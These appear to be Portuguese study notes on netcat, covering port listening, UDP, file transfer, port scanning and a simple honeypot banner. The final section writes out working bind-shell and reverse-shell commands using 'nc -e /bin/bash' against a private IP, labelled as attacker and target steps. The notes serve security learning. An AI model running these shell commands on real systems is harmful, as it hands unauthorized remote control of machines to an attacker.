vem instalado na maioria dos linux(nc, netcat, nc.traditional)

Exemplo de uso:
	nc www.businesscorp.com.br 21  -- Conecta no serviço rodando na porta 21 do servidor indiciado.

Abrir uma porta especifica no navegador
	nc -vlp 3333
Ver portas tcp abertas no sistema
	netstat -nlpt
Criar um arquivo de texto com nano e carregar na porta 80
	nano banner 
	nc -vnlp < banner    - Ira mostrar a mensagem salva no banner na pagina web ou pelo outro terminal.

## UDP e File Transfer

Abrir porta UDP
	nc -vnlup 53

Verificar portas UDP abertas
	netstat -nlpu

conectar numa porta udp aberta
	nc -vnu 192.168.124.199 53

Abrindo porta e recebendo arquivos
	nc -vnlp 5050 > ncat.txt    -- tudo oque receber será enviado ao arquivo de testo 'ncat.txt'

Enviando arquivos com o nc
	nc -v 192.168.124.199 5050 < teste.txt   -- enviando o arquivo 'test.txt' para o ip e porta 5050.
	Obs: O problema é não controlar o envio e saber se o envio foi correto por ser udp, porem pode ser verificado o tamanho do arquivo enviado e recebido, caso sejam iguais então o envio foi certo.

## Port Scanning

Ler porta
	nc -vnz 192.168.1.5 5050

Ler um intervalo de portas
	nc -vnz 192.168.1.5 50-100


## Honeypot

Criar um banner simulando o acesso a algum serviço, exemplo o FTP com o texto "220 ProFTPD 1.3.4a Server (ubuntu)" e direcionar esse banner a porta aberta
	nc -vnlp 21 < banner.txt 1>> banner.log 2>> banner.log;echo $(date) >> banner.log      -- ele ira direcionar o arquivo banner para a porta aberta e qualquer interação feita nessa porta ira direcionar para o arquivo "banner.log", o 1>> envia os acertos e o 2>> envia os erros. A ultima linha serve para enviar a data e hora do acesso.

Uma forma de uso é criar uma porta falsa(honeypot) e quando algum IP conectar nessa porta criar uma regra de firewall para bloquear esse IP pois se a porta é falsa não deveria ter conexões e significa que esse IP está fazendo PortScanning.


## BIND SHELL X REVERSE SHELL

![[Pasted image 20240823155921.png]]
	Tem que abrir uma porta no servidor
	Você conecta na porta aberta do servidor alvo e controla o sistema após a conexão

![[Pasted image 20240823160105.png]]
	Não abre nenhuma porta no servidor alvo
	Você abre uma porta na sua maquina e faz o servidor alvo se conectar a sua maquina e envia a shell
	

### Bind Shell com NetCat

No servidor eu rodo o comando 
	nc -vnlp 5050 -e /bin/bash     -- O "-e" passa um programa e nesse caso é o bash do servidor, quem conectar na porta 5050 tera acesso ao terminal do outro servidor e podera realizar qualquer comando linux no terminal.
Para conectar
	nc -vn 192.168.124.199 5050    -- Com o IP do servidor e a porta 5050 eu tenho acesso ao bash desse servidor.

### Reverse Shell com NetCat

Na maquina do atacante abre e fica ouvindo a porta 5050
	nc -vnlp 5050

Na maquina alvo ou servidor alvo eu faço a conexão na porta 5050 e envio o bash do sistema ou cmd(windows).
	nc -vn 192.168.124.199 5050 -e /bin/bash

Dessa forma tenho acesso ao servidor alvo sem abrir nenhuma porta do mesmo.

